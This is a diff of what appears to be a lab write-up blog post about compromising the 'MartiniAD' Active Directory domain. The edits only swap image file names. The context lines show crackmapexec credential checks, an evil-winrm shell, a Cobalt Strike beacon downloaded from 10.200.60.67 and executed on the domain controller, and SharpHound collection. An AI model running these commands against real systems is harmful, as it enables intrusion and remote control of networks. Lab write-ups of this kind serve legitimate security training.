@@ -6,7 +6,7 @@ date: 2026-05-28 00:00:00 +0800
 categories: [writeup, lab]
 tags: [writeup, lab]
 image:
-  path: /assets/img/martiniad.png
+  path: /assets/img/samurai-after-day-5k-qs.jpg
   alt: MartiniAD
 pin: false
 ---
@@ -122,7 +122,7 @@ crackmapexec smb 10.1.21.72 -u mprice -p '*martini*' -d DRY.MARTINI.BARS
 crackmapexec winrm 10.1.21.72 -u mprice -p '*martini*' -d DRY.MARTINI.BARS
 ```
 
-![image](/assets/img/martiniad_mprice_smb.png){: .mx-auto .shadow .rounded-10 w="800" }
+![image](/assets/img/martiniad_mprice_smb.jpeg){: .mx-auto .shadow .rounded-10 w="800" }
 
 SMB returned `[+]` confirming valid credentials for `mprice`. WinRM access was denied — `mprice` is not a member of Remote Management Users.
 
@@ -137,7 +137,7 @@ crackmapexec smb 10.1.21.72 -u mprice -p '*martini*' -d DRY.MARTINI.BARS --share
 crackmapexec smb 10.1.21.72 -u mprice -p '*martini*' -d DRY.MARTINI.BARS --users
 ```
 
-![image](/assets/img/martiniad_users.png){: .mx-auto .shadow .rounded-10 w="800" }
+![image](/assets/img/martiniad_users.jpeg){: .mx-auto .shadow .rounded-10 w="800" }
 
 Domain users identified:
 
@@ -189,7 +189,7 @@ crackmapexec winrm 10.1.21.72 -u ATHENA_SVC -p '1dirtymartini' -d DRY.MARTINI.BA
 evil-winrm -i 10.1.21.72 -u ATHENA_SVC -p '1dirtymartini'
 ```
 
-![image](/assets/img/martiniad_winrm.png){: .mx-auto .shadow .rounded-10 w="800" }
+![image](/assets/img/martiniad_winrm.jpeg){: .mx-auto .shadow .rounded-10 w="800" }
 
 A shell was established as `ATHENA_SVC` on `DC01`.
 
@@ -199,7 +199,7 @@ A shell was established as `ATHENA_SVC` on `DC01`.
 
 A Cobalt Strike HTTP listener was configured with the team server at `10.200.60.67` on port `80`. A beacon payload was generated and hosted via Cobalt Strike's built-in web server.
 
-![image](/assets/img/martiniad_cs_setup.png){: .mx-auto .shadow .rounded-10 w="800" }
+![image](/assets/img/martiniad_cs_setup.jpeg){: .mx-auto .shadow .rounded-10 w="800" }
 
 From the Evil-WinRM session, the beacon was downloaded and executed on the target:
 
@@ -210,7 +210,7 @@ Invoke-WebRequest -Uri "http://10.200.60.67:80/beacon.exe" -OutFile "$env:APPDAT
 
 A beacon callback was received confirming execution as `DRY\ATHENA_SVC` on `DC01` — x64, PID 4544.
 
-![image](/assets/img/martiniad_beacon.png){: .mx-auto .shadow .rounded-10 w="800" }
+![image](/assets/img/martiniad_beacon.jpeg){: .mx-auto .shadow .rounded-10 w="800" }
 
 ---
 
@@ -237,7 +237,7 @@ SharpHound was executed via `execute-assembly` to collect AD relationship data f
 execute-assembly /home/kali/Tools/SharpCollection/NetFramework_4.5_Any/SharpHound.exe -c All --zipfilename bh_output.zip --outputdirectory C:\Users\ATHENA_SVC\AppData\Roaming
 ```
 
-![image](/assets/img/martiniad_sharphound.png){: .mx-auto .shadow .rounded-10 w="800" }
+![image](/assets/img/martiniad_sharphound.jpeg){: .mx-auto .shadow .rounded-10 w="800" }
 
 SharpHound completed enumeration of 62 objects across the `DRY.MARTINI.BARS` domain. Seatbelt was also run for local recon revealing key findings:
 
